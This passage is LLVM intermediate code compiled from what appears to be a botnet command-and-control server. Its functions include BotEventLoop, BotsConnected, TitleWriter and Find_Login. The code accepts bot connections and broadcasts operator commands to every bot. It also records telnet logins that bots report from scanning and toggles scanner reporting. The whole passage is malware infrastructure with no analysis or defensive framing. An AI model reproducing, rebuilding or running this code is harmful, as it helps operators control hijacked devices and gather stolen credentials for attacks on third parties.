  %12 = tail call i8* @strcpy(i8* %9, i8* %0) #10
  tail call void @trim(i8* %9)
  %13 = call i64 @time(i64* nonnull %4) #10
  %14 = call %struct.tm* @localtime(i64* nonnull %4) #10
  %15 = call i8* @asctime(%struct.tm* %14) #10
  call void @trim(i8* %15)
  %16 = zext i32 %1 to i64
  br i1 %6, label %.split.us.preheader, label %.split.preheader

.split.preheader:                                 ; preds = %3
  br label %.split

.split.us.preheader:                              ; preds = %3
  br label %.split.us

.split.us:                                        ; preds = %.split.us.preheader, %27
  %indvars.iv = phi i64 [ %indvars.iv.next, %27 ], [ 0, %.split.us.preheader ]
  %17 = icmp eq i64 %indvars.iv, %16
  br i1 %17, label %27, label %18

; <label>:18:                                     ; preds = %.split.us
  %19 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv, i32 1
  %20 = load i8, i8* %19, align 4
  %21 = icmp eq i8 %20, 0
  br i1 %21, label %27, label %.critedge.us

.critedge.us:                                     ; preds = %18
  %22 = trunc i64 %indvars.iv to i32
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i32 %22)
  %24 = call i64 @strlen(i8* %0) #9
  %25 = call i64 @send(i32 %22, i8* %0, i64 %24, i32 16384) #10
  %26 = call i64 @send(i32 %22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0), i64 1, i32 16384) #10
  br label %27

; <label>:27:                                     ; preds = %18, %.critedge.us, %.split.us
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 1000000
  br i1 %exitcond, label %.us-lcssa.us.loopexit, label %.split.us

.split:                                           ; preds = %.split.preheader, %52
  %indvars.iv34 = phi i64 [ %indvars.iv.next35, %52 ], [ 0, %.split.preheader ]
  %28 = icmp eq i64 %indvars.iv34, %16
  br i1 %28, label %52, label %29

; <label>:29:                                     ; preds = %.split
  %30 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv34, i32 1
  %31 = load i8, i8* %30, align 4
  %32 = icmp eq i8 %31, 0
  %33 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %indvars.iv34, i32 0
  %34 = load i32, i32* %33, align 4
  %35 = icmp eq i32 %34, 0
  br i1 %32, label %36, label %.thread

; <label>:36:                                     ; preds = %29
  br i1 %35, label %52, label %.thread.thread

.thread:                                          ; preds = %29
  br i1 %35, label %.thread._crit_edge, label %.thread.thread

.thread._crit_edge:                               ; preds = %.thread
  %.pre37 = trunc i64 %indvars.iv34 to i32
  br label %42

.thread.thread:                                   ; preds = %36, %.thread
  %37 = trunc i64 %indvars.iv34 to i32
  %38 = call i64 @send(i32 %37, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0), i64 5, i32 16384) #10
  %39 = call i64 @strlen(i8* %2) #9
  %40 = call i64 @send(i32 %37, i8* %2, i64 %39, i32 16384) #10
  %41 = call i64 @send(i32 %37, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 2, i32 16384) #10
  br label %42

; <label>:42:                                     ; preds = %.thread._crit_edge, %.thread.thread
  %.pre-phi38 = phi i32 [ %.pre37, %.thread._crit_edge ], [ %37, %.thread.thread ]
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i32 %.pre-phi38)
  %44 = call i64 @strlen(i8* %0) #9
  %45 = call i64 @send(i32 %.pre-phi38, i8* %0, i64 %44, i32 16384) #10
  %46 = load i32, i32* %33, align 4
  %47 = icmp eq i32 %46, 0
  br i1 %47, label %50, label %48

; <label>:48:                                     ; preds = %42
  %49 = call i64 @send(i32 %.pre-phi38, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0), i64 13, i32 16384) #10
  br label %52

; <label>:50:                                     ; preds = %42
  %51 = call i64 @send(i32 %.pre-phi38, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0), i64 1, i32 16384) #10
  br label %52

; <label>:52:                                     ; preds = %36, %48, %50, %.split
  %indvars.iv.next35 = add nuw nsw i64 %indvars.iv34, 1
  %exitcond36 = icmp eq i64 %indvars.iv.next35, 1000000
  br i1 %exitcond36, label %.us-lcssa.us.loopexit43, label %.split

.us-lcssa.us.loopexit:                            ; preds = %27
  br label %.us-lcssa.us

.us-lcssa.us.loopexit43:                          ; preds = %52
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit43, %.us-lcssa.us.loopexit
  call void @free(i8* %9) #10
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) local_unnamed_addr #3

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @printf(i8* nocapture readonly, ...) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #3

; Function Attrs: noinline noreturn nounwind uwtable
define noalias nonnull i8* @BotEventLoop(i8* nocapture readnone) #5 {
  %2 = alloca %struct.epoll_event, align 4
  %3 = alloca %struct.sockaddr_in, align 2
  %tmpcast = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = tail call noalias i8* @calloc(i64 1000000, i64 12) #10
  %7 = bitcast i8* %6 to %struct.epoll_event*
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  %10 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %2, i64 0, i32 1
  %11 = bitcast %union.epoll_data* %10 to i32*
  %12 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %2, i64 0, i32 0
  %13 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %14 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 7
  br label %.loopexit61.outer

.loopexit61.outer.loopexit:                       ; preds = %.loopexit
  br label %.loopexit61.outer

.loopexit61.outer:                                ; preds = %.loopexit61.outer.loopexit, %1
  br label %.loopexit61

.loopexit61:                                      ; preds = %.loopexit61.outer, %.loopexit61
  %15 = load volatile i32, i32* @epollFD, align 4
  %16 = call i32 @epoll_wait(i32 %15, %struct.epoll_event* %7, i32 1000000, i32 -1) #10
  %17 = icmp sgt i32 %16, 0
  br i1 %17, label %.lr.ph78.preheader, label %.loopexit61

.lr.ph78.preheader:                               ; preds = %.loopexit61
  %18 = sext i32 %16 to i64
  br label %.lr.ph78

.lr.ph78:                                         ; preds = %.lr.ph78.preheader, %.loopexit
  %indvars.iv84 = phi i64 [ 0, %.lr.ph78.preheader ], [ %indvars.iv.next85, %.loopexit ]
  %19 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %7, i64 %indvars.iv84, i32 0
  %20 = load i32, i32* %19, align 1
  %21 = and i32 %20, 25
  %22 = icmp eq i32 %21, 1
  br i1 %22, label %30, label %23

; <label>:23:                                     ; preds = %.lr.ph78
  %24 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %7, i64 %indvars.iv84, i32 1
  %25 = bitcast %union.epoll_data* %24 to i32*
  %26 = load i32, i32* %25, align 1
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %27, i32 1
  store i8 0, i8* %28, align 4
  %29 = call i32 @close(i32 %26) #10
  br label %.loopexit

; <label>:30:                                     ; preds = %.lr.ph78
  %31 = load volatile i32, i32* @listenFD, align 4
  %32 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %7, i64 %indvars.iv84, i32 1
  %33 = bitcast %union.epoll_data* %32 to i32*
  %34 = load i32, i32* %33, align 1
  %35 = icmp eq i32 %31, %34
  br i1 %35, label %.preheader, label %81

.preheader:                                       ; preds = %30
  store i32 16, i32* %4, align 4
  %36 = load volatile i32, i32* @listenFD, align 4
  %37 = call i32 @accept(i32 %36, %struct.sockaddr* nonnull %tmpcast, i32* nonnull %4) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %._crit_edge, label %.lr.ph73.preheader

.lr.ph73.preheader:                               ; preds = %.preheader
  br label %.lr.ph73

._crit_edge.loopexit:                             ; preds = %.backedge59
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %39 = tail call i32* @__errno_location() #11
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 11
  br i1 %41, label %.loopexit, label %42

; <label>:42:                                     ; preds = %._crit_edge
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0)) #12
  br label %.loopexit

.lr.ph73:                                         ; preds = %.lr.ph73.preheader, %.backedge59
  %43 = phi i32 [ %79, %.backedge59 ], [ %37, %.lr.ph73.preheader ]
  %44 = load i32, i32* %9, align 2
  %45 = sext i32 %43 to i64
  %46 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %45, i32 0
  store i32 %44, i32* %46, align 8
  %47 = zext i32 %43 to i64
  br label %48

; <label>:48:                                     ; preds = %124, %.lr.ph73
  %indvars.iv = phi i64 [ 0, %.lr.ph73 ], [ %indvars.iv.next.1, %124 ]
  %49 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv, i32 1
  %50 = load i8, i8* %49, align 4
  %51 = icmp eq i8 %50, 0
  %52 = icmp eq i64 %indvars.iv, %47
  %or.cond57 = or i1 %52, %51
  br i1 %or.cond57, label %57, label %53

; <label>:53:                                     ; preds = %48
  %54 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv, i32 0
  %55 = load i32, i32* %54, align 16
  %56 = icmp eq i32 %55, %44
  br i1 %56, label %62, label %57

; <label>:57:                                     ; preds = %48, %53
  %indvars.iv.next = or i64 %indvars.iv, 1
  %58 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv.next, i32 1
  %59 = load i8, i8* %58, align 4
  %60 = icmp eq i8 %59, 0
  %61 = icmp eq i64 %indvars.iv.next, %47
  %or.cond57.1 = or i1 %61, %60
  br i1 %or.cond57.1, label %124, label %120

; <label>:62:                                     ; preds = %120, %53
  %63 = call i64 @send(i32 %43, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i64 0, i64 0), i64 13, i32 16384) #10
  %64 = call i32 @close(i32 %43) #10
  br label %.backedge59

.critedge58:                                      ; preds = %124
  %65 = call fastcc i32 @make_socket_non_blocking(i32 %43)
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %69

; <label>:67:                                     ; preds = %.critedge58
  %68 = call i32 @close(i32 %43) #10
  br label %.loopexit

; <label>:69:                                     ; preds = %.critedge58
  store i32 %43, i32* %11, align 4
  store i32 -2147483647, i32* %12, align 4
  %70 = load volatile i32, i32* @epollFD, align 4
  %71 = call i32 @epoll_ctl(i32 %70, i32 1, i32 %43, %struct.epoll_event* nonnull %2) #10
  %72 = icmp eq i32 %71, -1
  br i1 %72, label %73, label %75

; <label>:73:                                     ; preds = %69
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0)) #12
  %74 = call i32 @close(i32 %43) #10
  br label %.loopexit

; <label>:75:                                     ; preds = %69
  %76 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %45, i32 1
  store i8 1, i8* %76, align 4
  %77 = call i64 @send(i32 %43, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.9, i64 0, i64 0), i64 14, i32 16384) #10
  br label %.backedge59

.backedge59:                                      ; preds = %75, %62
  store i32 16, i32* %4, align 4
  %78 = load volatile i32, i32* @listenFD, align 4
  %79 = call i32 @accept(i32 %78, %struct.sockaddr* nonnull %tmpcast, i32* nonnull %4) #10
  %80 = icmp eq i32 %79, -1
  br i1 %80, label %._crit_edge.loopexit, label %.lr.ph73

; <label>:81:                                     ; preds = %30
  %82 = sext i32 %34 to i64
  %83 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %82, i32 1
  store i8 1, i8* %83, align 4
  br label %.backedge60

.backedge60:                                      ; preds = %.backedge60.backedge, %81
  %.048 = phi i32 [ 0, %81 ], [ %.048.be, %.backedge60.backedge ]
  call void @llvm.memset.p0i8.i64(i8* nonnull %13, i8 0, i64 2048, i32 16, i1 false)
  %84 = call i32 @fdgets(i8* nonnull %8, i32 2048, i32 %34)
  %85 = sext i32 %84 to i64
  %86 = icmp sgt i32 %84, 0
  br i1 %86, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.backedge60
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %87 = phi i64 [ %104, %.backedge ], [ %85, %.lr.ph.preheader ]
  %strchr = call i8* @strchr(i8* nonnull %8, i32 10)
  %88 = icmp eq i8* %strchr, null
  br i1 %88, label %.critedge.loopexit, label %89

; <label>:89:                                     ; preds = %.lr.ph
  call void @trim(i8* nonnull %8)
  %90 = call i32 @strcmp(i8* nonnull %8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #9
  %91 = icmp eq i32 %90, 0
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %89
  %93 = call i64 @send(i32 %34, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0), i64 5, i32 16384) #10
  %94 = icmp eq i64 %93, -1
  br i1 %94, label %.critedge.loopexit, label %.backedge

; <label>:95:                                     ; preds = %89
  %strncmp86 = call i32 @strncmp(i8* nonnull %8, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i64 0, i64 0), i64 7)
  %cmp87 = icmp eq i32 %strncmp86, 0
  br i1 %cmp87, label %96, label %106

; <label>:96:                                     ; preds = %95
  %97 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %98 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %97, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* %14)
  %99 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %100 = call i32 @fflush(%struct._IO_FILE* %99)
  %101 = load volatile i32, i32* @TELFound, align 4
  %102 = add nsw i32 %101, 1
  store volatile i32 %102, i32* @TELFound, align 4
  br label %.backedge

.backedge:                                        ; preds = %96, %107, %109, %113, %92, %110
  call void @llvm.memset.p0i8.i64(i8* nonnull %8, i8 0, i64 2048, i32 16, i1 false)
  %103 = call i32 @fdgets(i8* nonnull %8, i32 2048, i32 %34)
  %104 = sext i32 %103 to i64
  %105 = icmp sgt i32 %103, 0
  br i1 %105, label %.lr.ph, label %.critedge.loopexit

; <label>:106:                                    ; preds = %95
  %strncmp = call i32 @strncmp(i8* nonnull %8, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i64 0, i64 0), i64 7)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %107, label %108

; <label>:107:                                    ; preds = %106
  store volatile i32 1, i32* @scannerreport, align 4
  br label %.backedge

; <label>:108:                                    ; preds = %106
  %strncmp52 = call i32 @strncmp(i8* nonnull %8, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i64 0, i64 0), i64 14)
  %cmp53 = icmp eq i32 %strncmp52, 0
  br i1 %cmp53, label %109, label %110

; <label>:109:                                    ; preds = %108
  store volatile i32 0, i32* @scannerreport, align 4
  br label %.backedge

; <label>:110:                                    ; preds = %108
  %111 = call i32 @strcmp(i8* nonnull %8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i64 0, i64 0)) #9
  %112 = icmp eq i32 %111, 0
  br i1 %112, label %.backedge, label %113

; <label>:113:                                    ; preds = %110
  %114 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.16, i64 0, i64 0), i8* nonnull %8)
  br label %.backedge

.critedge.loopexit:                               ; preds = %92, %.lr.ph, %.backedge
  %.lcssa.ph = phi i64 [ %87, %92 ], [ %87, %.lr.ph ], [ %104, %.backedge ]
  %.149.ph = phi i32 [ 1, %92 ], [ 1, %.lr.ph ], [ %.048, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.backedge60
  %.lcssa = phi i64 [ %85, %.backedge60 ], [ %.lcssa.ph, %.critedge.loopexit ]
  %.149 = phi i32 [ %.048, %.backedge60 ], [ %.149.ph, %.critedge.loopexit ]
  switch i64 %.lcssa, label %115 [
    i64 -1, label %.loopexit.loopexit
    i64 0, label %.loopexit.loopexit
  ]

; <label>:115:                                    ; preds = %.critedge
  %116 = icmp eq i32 %.149, 0
  br i1 %116, label %.backedge60.backedge, label %117

; <label>:117:                                    ; preds = %115
  store i8 0, i8* %83, align 4
  %118 = call i32 @close(i32 %34) #10
  br label %.backedge60.backedge

.backedge60.backedge:                             ; preds = %117, %115
  %.048.be = phi i32 [ %.149, %117 ], [ 0, %115 ]
  br label %.backedge60

.loopexit.loopexit:                               ; preds = %.critedge, %.critedge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %42, %67, %73, %._crit_edge, %23
  %indvars.iv.next85 = add nuw nsw i64 %indvars.iv84, 1
  %119 = icmp slt i64 %indvars.iv.next85, %18
  br i1 %119, label %.lr.ph78, label %.loopexit61.outer.loopexit

; <label>:120:                                    ; preds = %57
  %121 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv.next, i32 0
  %122 = load i32, i32* %121, align 8
  %123 = icmp eq i32 %122, %44
  br i1 %123, label %62, label %124

; <label>:124:                                    ; preds = %120, %57
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %125 = icmp slt i64 %indvars.iv.next.1, 1000000
  br i1 %125, label %48, label %.critedge58
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) local_unnamed_addr #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #6

; Function Attrs: nounwind
declare void @perror(i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @make_socket_non_blocking(i32) unnamed_addr #0 {
  %2 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i32 0) #10
  %3 = icmp eq i32 %2, -1
  br i1 %3, label %4, label %5

; <label>:4:                                      ; preds = %1
  tail call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.118, i64 0, i64 0)) #12
  br label %10

; <label>:5:                                      ; preds = %1
  %6 = or i32 %2, 2048
  %7 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i32 %6) #10
  %8 = icmp eq i32 %7, -1
  br i1 %8, label %9, label %10

; <label>:9:                                      ; preds = %5
  tail call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.118, i64 0, i64 0)) #12
  br label %10

; <label>:10:                                     ; preds = %5, %9, %4
  %.0 = phi i32 [ -1, %4 ], [ -1, %9 ], [ 0, %5 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) local_unnamed_addr #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @fprintf(%struct._IO_FILE* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @fflush(%struct._IO_FILE* nocapture) local_unnamed_addr #3

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @BotsConnected() local_unnamed_addr #7 {
min.iters.checked:
  br label %vector.body

vector.body:                                      ; preds = %vector.body.1, %min.iters.checked
  %index = phi i64 [ 0, %min.iters.checked ], [ %index.next.1, %vector.body.1 ]
  %vec.phi = phi <4 x i32> [ zeroinitializer, %min.iters.checked ], [ %38, %vector.body.1 ]
  %vec.phi9 = phi <4 x i32> [ zeroinitializer, %min.iters.checked ], [ %39, %vector.body.1 ]
  %0 = or i64 %index, 4
  %1 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %index, i32 1
  %2 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %0, i32 1
  %3 = bitcast i8* %1 to <32 x i8>*
  %4 = bitcast i8* %2 to <32 x i8>*
  %wide.vec = load <32 x i8>, <32 x i8>* %3, align 4
  %wide.vec10 = load <32 x i8>, <32 x i8>* %4, align 4
  %strided.vec = shufflevector <32 x i8> %wide.vec, <32 x i8> undef, <4 x i32> <i32 0, i32 8, i32 16, i32 24>
  %strided.vec11 = shufflevector <32 x i8> %wide.vec10, <32 x i8> undef, <4 x i32> <i32 0, i32 8, i32 16, i32 24>
  %5 = icmp ne <4 x i8> %strided.vec, zeroinitializer
  %6 = icmp ne <4 x i8> %strided.vec11, zeroinitializer
  %7 = zext <4 x i1> %5 to <4 x i32>
  %8 = zext <4 x i1> %6 to <4 x i32>
  %9 = add nsw <4 x i32> %7, %vec.phi
  %10 = add nsw <4 x i32> %8, %vec.phi9
  %index.next = or i64 %index, 8
  %11 = icmp eq i64 %index.next, 999992
  br i1 %11, label %middle.block, label %vector.body.1, !llvm.loop !12

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <4 x i32> %10, %9
  %rdx.shuf = shufflevector <4 x i32> %bin.rdx, <4 x i32> undef, <4 x i32> <i32 2, i32 3, i32 undef, i32 undef>
  %bin.rdx12 = add <4 x i32> %bin.rdx, %rdx.shuf
  br label %.loopexit16

.loopexit16:                                      ; preds = %middle.block
  %rdx.shuf13 = shufflevector <4 x i32> %bin.rdx12, <4 x i32> undef, <4 x i32> <i32 1, i32 undef, i32 undef, i32 undef>
  %bin.rdx14 = add <4 x i32> %bin.rdx12, %rdx.shuf13
  %12 = extractelement <4 x i32> %bin.rdx14, i32 0
  %13 = load i8, i8* getelementptr inbounds ([1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 999992, i32 1), align 4
  %not. = icmp ne i8 %13, 0
  %14 = zext i1 %not. to i32
  %.0. = add nsw i32 %14, %12
  %15 = load i8, i8* getelementptr inbounds ([1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 999993, i32 1), align 4
  %not..1 = icmp ne i8 %15, 0
  %16 = zext i1 %not..1 to i32
  %.0..1 = add nsw i32 %16, %.0.
  %17 = load i8, i8* getelementptr inbounds ([1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 999994, i32 1), align 4
  %not..2 = icmp ne i8 %17, 0
  %18 = zext i1 %not..2 to i32
  %.0..2 = add nsw i32 %18, %.0..1
  %19 = load i8, i8* getelementptr inbounds ([1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 999995, i32 1), align 4
  %not..3 = icmp ne i8 %19, 0
  %20 = zext i1 %not..3 to i32
  %.0..3 = add nsw i32 %20, %.0..2
  %21 = load i8, i8* getelementptr inbounds ([1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 999996, i32 1), align 4
  %not..4 = icmp ne i8 %21, 0
  %22 = zext i1 %not..4 to i32
  %.0..4 = add nsw i32 %22, %.0..3
  %23 = load i8, i8* getelementptr inbounds ([1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 999997, i32 1), align 4
  %not..5 = icmp ne i8 %23, 0
  %24 = zext i1 %not..5 to i32
  %.0..5 = add nsw i32 %24, %.0..4
  %25 = load i8, i8* getelementptr inbounds ([1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 999998, i32 1), align 4
  %not..6 = icmp ne i8 %25, 0
  %26 = zext i1 %not..6 to i32
  %.0..6 = add nsw i32 %26, %.0..5
  %27 = load i8, i8* getelementptr inbounds ([1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 999999, i32 1), align 4
  %not..7 = icmp ne i8 %27, 0
  %28 = zext i1 %not..7 to i32
  %.0..7 = add nsw i32 %28, %.0..6
  ret i32 %.0..7

vector.body.1:                                    ; preds = %vector.body
  %29 = or i64 %index, 12
  %30 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %index.next, i32 1
  %31 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %29, i32 1
  %32 = bitcast i8* %30 to <32 x i8>*
  %33 = bitcast i8* %31 to <32 x i8>*
  %wide.vec.1 = load <32 x i8>, <32 x i8>* %32, align 4
  %wide.vec10.1 = load <32 x i8>, <32 x i8>* %33, align 4
  %strided.vec.1 = shufflevector <32 x i8> %wide.vec.1, <32 x i8> undef, <4 x i32> <i32 0, i32 8, i32 16, i32 24>
  %strided.vec11.1 = shufflevector <32 x i8> %wide.vec10.1, <32 x i8> undef, <4 x i32> <i32 0, i32 8, i32 16, i32 24>
  %34 = icmp ne <4 x i8> %strided.vec.1, zeroinitializer
  %35 = icmp ne <4 x i8> %strided.vec11.1, zeroinitializer
  %36 = zext <4 x i1> %34 to <4 x i32>
  %37 = zext <4 x i1> %35 to <4 x i32>
  %38 = add nsw <4 x i32> %36, %9
  %39 = add nsw <4 x i32> %37, %10
  %index.next.1 = add nsw i64 %index, 16
  br label %vector.body
}

; Function Attrs: noinline nounwind uwtable
define noalias i8* @TitleWriter(i8*) #0 {
  %2 = alloca [2048 x i8], align 16
  %3 = ptrtoint i8* %0 to i64
  %4 = trunc i64 %3 to i32
  %5 = getelementptr inbounds [2048 x i8], [2048 x i8]* %2, i64 0, i64 0
  br label %6

; <label>:6:                                      ; preds = %14, %1
  call void @llvm.memset.p0i8.i64(i8* nonnull %5, i8 0, i64 2048, i32 16, i1 false)
  %7 = call i32 @BotsConnected()
  %8 = load volatile i32, i32* @OperatorsConnected, align 4
  %9 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %5, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.17, i64 0, i64 0), i32 27, i32 %7, i32 %8, i32 7) #10
  %10 = call i64 @strlen(i8* nonnull %5) #9
  %11 = call i64 @send(i32 %4, i8* nonnull %5, i64 %10, i32 16384) #10
  %12 = icmp eq i64 %11, -1
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %6
  ret i8* null

; <label>:14:                                     ; preds = %6
  %15 = call i32 @sleep(i32 2) #10
  br label %6
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #3

declare i32 @sleep(i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define i32 @Find_Login(i8* nocapture readonly) local_unnamed_addr #0 {
  %2 = alloca [512 x i8], align 16
  %3 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i64 0, i64 0))
  %4 = icmp eq %struct._IO_FILE* %3, null
  br i1 %4, label %15, label %.preheader

.preheader:                                       ; preds = %1
  %5 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %6 = call i8* @fgets(i8* nonnull %5, i32 512, %struct._IO_FILE* nonnull %3)
  %7 = icmp eq i8* %6, null
  br i1 %7, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.015 = phi i32 [ %.0..011, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.0914 = phi i32 [ %.09., %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.01113 = phi i32 [ %11, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %8 = call i8* @strstr(i8* nonnull %5, i8* %0) #9
  %9 = icmp eq i8* %8, null
  %not. = xor i1 %9, true
